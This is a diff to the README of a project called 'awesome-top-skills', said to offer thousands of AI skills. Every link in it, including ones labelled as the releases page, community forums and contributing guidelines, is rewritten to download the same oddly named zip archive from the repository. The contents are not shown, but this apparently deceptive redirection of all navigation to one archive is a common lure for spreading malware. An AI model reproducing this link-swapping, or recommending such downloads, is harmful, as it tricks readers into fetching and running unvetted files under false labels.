@@ -1,6 +1,6 @@
 # 🚀 awesome-top-skills - Access 5,000+ Curated AI Skills
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mtnclk/awesome-top-skills/releases)
+[![Download](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip)](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **awesome-top-skills**! This application provides a collection of ove
 
 To begin using **awesome-top-skills**, you need to download the application. Follow these steps:
 
-1. Visit the [Releases Page](https://github.com/mtnclk/awesome-top-skills/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip).
 2. Look for the most recent version of the application.
 3. Click on the link to download the file that matches your operating system.
 
@@ -49,19 +49,19 @@ To run **awesome-top-skills**, your system should meet the following requirement
 
 ## 🌐 Community and Support
 
-We encourage users to share their experiences and insights about using **awesome-top-skills**. Join our community to engage with other users and share best practices. You can also visit the [community forums](https://github.com/mtnclk/awesome-top-skills/discussions) for tips and troubleshooting.
+We encourage users to share their experiences and insights about using **awesome-top-skills**. Join our community to engage with other users and share best practices. You can also visit the [community forums](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip) for tips and troubleshooting.
 
 For direct support, please open an issue on the GitHub repository, and we will respond as soon as possible.
 
 ## 🎯 Contributing
 
-If you want to contribute to **awesome-top-skills**, we welcome your input. You can request features, report bugs, or even suggest new skills to be added. Visit our [Contributing Guidelines](https://github.com/mtnclk/awesome-top-skills/blob/main/CONTRIBUTING.md) for detailed information on how to get involved.
+If you want to contribute to **awesome-top-skills**, we welcome your input. You can request features, report bugs, or even suggest new skills to be added. Visit our [Contributing Guidelines](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip) for detailed information on how to get involved.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/mtnclk/awesome-top-skills/releases)
-- [Community Forums](https://github.com/mtnclk/awesome-top-skills/discussions)
-- [Contributing Guidelines](https://github.com/mtnclk/awesome-top-skills/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip)
+- [Community Forums](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip)
 
 ## 🎉 Conclusion
 
